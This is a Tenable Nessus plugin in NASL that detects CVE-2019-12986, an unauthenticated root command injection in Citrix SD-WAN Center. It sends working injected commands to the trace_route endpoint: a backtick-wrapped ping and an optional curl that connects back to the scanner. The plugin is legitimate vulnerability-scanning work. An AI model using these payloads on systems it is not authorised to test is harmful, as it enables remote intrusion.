#TRUSTED a5033c56fd4a98707dccbc1eecd835e58ac121f93a046b1fe214a5b7ddf24bae284b419facdb638338bf236519f1d7cbf3e44a68456e5680dcd180f92c30f29f0e7c7c89d409dd9e9a1dfa07db8ff876a3d912d358d5af70a0fe00aba8c7cb9c8394e795e016cccc1b5424b5454769be4f40edb465c0336eb32ed2e69c1cc1be7ef1020f4f1287b891b84d3012bdbcbb1134c2a922f1f4cd0a329cf210a4318901aa99671751cd2123d2e478d1d00541b822cb97635055769a7cc835bccc664768d041b24c70a22b42146d303e7304c669b620200d93d8b322e2918446350b4df430baf02170fa50d102160ae55e2f6b391cdee2d027417fdcddb146c47faec2c524a13e3cf3f64de4d4ebd9acc45eb9d8e8bd7115d1f4345bc6ed6223216962d5508d12b335b5f3733ed914347de68172114f21462e7e70f5a501be24de5d5acdade14751b071d7d9c130ca7d73b5bd00ed388b1f93329c3df1f88dc5d835dda5340f02d736eec5c1363c45c024d3699fe77c676f47ecbd261ae3904b9fd433866712b4dc2c4599f6e201041e25d6fd195066f476dce011925b31779e8cbe20ec547a6c81e79cbabb3f3113a4c3bd62643899ae97cbf853f489faec5b86b574251b7826f351c6180bf8e83e71291d534f32d232cc72cd4486852dbeefa129312e7cdb2df930de9c92ed9be8fd7baea4e25fd182426316db8e76c74a42a0c931
#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(132103);
  script_version("1.6");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2019-12986");
  script_bugtraq_id(109133);
  script_xref(name:"TRA", value:"TRA-2019-31");

  script_name(english:"Citrix SD-WAN Center trace_route Unauthenticated Remote Command Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is affected by a remote command injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Citrix SD-WAN Center is affected by a remote command injection vulnerability due to improper
sanitization of user-supplied input in the trace_route action of DiagnosticController. An unauthenticated, remote
attacker can exploit this, via a specially crafted HTTP request, to execute arbitrary commands on the remote host with
root privileges.

Note that Nessus can perform an additional check for this vulnerability. To do so, re-run the scan with the setting
'Perform thorough tests (may disrupt your network or impact scan speed)' enabled.");
  script_set_attribute(attribute:"see_also", value:"https://support.citrix.com/article/CTX251987");
  # https://www.tenable.com/blog/multiple-vulnerabilities-found-in-citrix-sd-wan-center-and-sd-wan-appliances
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a1b1f9a7");
  # https://medium.com/tenable-techblog/an-exploit-chain-against-citrix-sd-wan-709db08fb4ac
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0e0f39e");
  script_set_attribute(attribute:"see_also", value:"https://github.com/tenable/poc");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 10.2.3 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-12986");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/06/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/12/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:citrix:sd-wan-center");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("citrix_sdwan_center_detect.nbin");
  script_require_keys("installed_sw/Citrix SD-WAN Center");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include('audit.inc');
include('global_settings.inc');
include('install_func.inc');
include('misc_func.inc');
include('http.inc');
include('spad_log_func.inc');

##
# RCE exploitation of the trace_route action in DiagnosticController with an injected ping
#
# @remark Check RCE by suppling a ping command containing specific padding data to the trace_route action in DiagnosticController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_ping() {
  var ping_injection = 'ipAddress=%60ping+-c+10+-p+' + pattern + '+' + compat::this_host() + '%60';

  var ping_request =
    'POST /Collector/diagnostics/trace_route HTTP/1.1\r\n' +
    'Host: ' + get_host_ip() + ':' + port + '\r\n' +
    'Content-Type: application/x-www-form-urlencoded\r\n' +
    'Content-Length: ' + len(ping_injection) + '\r\n' +
    '\r\n' +
    ping_injection;

  spad_log(message:'Attempting to inject ping with:\n' + ping_request + '\n');


  var soc = open_sock_tcp(port);
  if (!soc)
    audit(AUDIT_SOCK_FAIL, port);

  var filter = 'icmp and icmp[0] = 8 and src host ' + get_host_ip();
  var ping_response = send_capture(socket:soc, data:ping_request, pcap_filter:filter);
  close(soc);

  if (empty_or_null(ping_response))
  {
    spad_log(message:'The ICMP response was empty or null\n');
    return {'vuln':false};
  }

  var icmp_data = toupper(hexstr(get_icmp_element(icmp:ping_response, element:'data')));
  spad_log(message:'Received ping with data: \n' + icmp_data);

  if (empty_or_null(icmp_data) || (pattern >!< icmp_data))
    return {'vuln':false};

  var rep_extra = '\nThe following command was executed on the vulnerable host:\n\n'
    + 'ping+-c+10+-p+' + pattern + '+' + compat::this_host();
  return {'vuln':true, 'request':make_list(ping_request), 'rep_extra':rep_extra};
}

##
# RCE exploitation of the trace_route action in DiagnosticController with an injected curl
#
# @remark Check RCE by suppling a curl command to the trace_route action in DiagnosticController
#
# @return array containing: a boolean that is true if the SD-WAN center is
# vulnerable as well as information for security report if necessary.
##
function check_curl() {
  # Open TCP socket on server to get back connections from targets
  var bind_result = bind_sock_tcp();

  if (isnull(bind_result))
    audit(AUDIT_SOCK_FAIL, port);

  var bind_sock = bind_result[0];
  var bind_port = bind_result[1];

  spad_log(message:'Attempting exploitation with back connect port: ' + bind_port + '\n');

  var curl_injection = 'ipAddress=%60curl+' + compat::this_host() + ':' + bind_port + '/Nessus' + pattern + '%60';

  var post_response = http_send_recv3(
    method        : 'POST',
    item          : '/Collector/diagnostics/trace_route',
    port          : port,
    content_type  : 'application/x-www-form-urlencoded',
    data          : curl_injection
  );

  var request_sent = http_last_sent_request();
  spad_log(message:'Attempted to inject curl with the following request:\n' + request_sent);

  if (!empty_or_null(post_response))
    spad_log(message:'The POST response was:\n' + post_response + '\n');

  # Listen for HTTP connect back
  var accept_sock = sock_accept(socket:bind_sock, timeout:10);
  if (!accept_sock)
  {
    close(bind_sock);
    spad_log(message:'Did not receive a connect back.\n');
    return {'vuln':false};
  }

  var curl_response = recv(socket:accept_sock, length:1024);

  if (empty_or_null(curl_response))
  {
    close(accept_sock);
    close(bind_sock);
    spad_log(message:'Empty response.\n');
    return {'vuln':false};
  }

  spad_log(message:'Successful connect back, received response: \n' + curl_response);

  close(accept_sock);
  close(bind_sock);

  if ('Nessus' + pattern >!< curl_response)
    return {'vuln':false};

  var rep_extra = '\nSuccessful connect back, received response:\n\n' + curl_response;
  return {'vuln':true, 'request':make_list(request_sent), 'rep_extra':rep_extra};
}

#
# Main
#

app_name = 'Citrix SD-WAN Center';
# Exit if app is not detected on the target host
get_install_count(app_name:app_name, exit_if_zero:TRUE);
port = get_http_port(default:443);

# Exit if app is not detected  on this port
get_single_install(
  app_name : app_name,
  port     : port
);

# Generate a random pattern for the payload to prove the vulnerability
pattern = rand_str(length:8, charset:'0123456789ABCDEF');
spad_log(message:'The pattern for exploit identification is: ' + pattern + '\n');

# Try to inject and detect a ping with the pattern
result = check_ping();

# If the ping injection did not succeed and thorough tests is enabled, try to
# inject curl and listen for an incoming request.
if (!result['vuln'] && thorough_tests)
  result = check_curl();

# If the command injection did not succeed, then audit as not vulnerable.
if (!result['vuln'])
  audit(AUDIT_LISTEN_NOT_VULN, app_name, port);

# Otherwise, a command injection succeeded so report it as vulnerable
security_report_v4(
  port: port,
  severity: SECURITY_HOLE,
  generic: TRUE,
  request: result['request'],
  rep_extra: result['rep_extra']
);
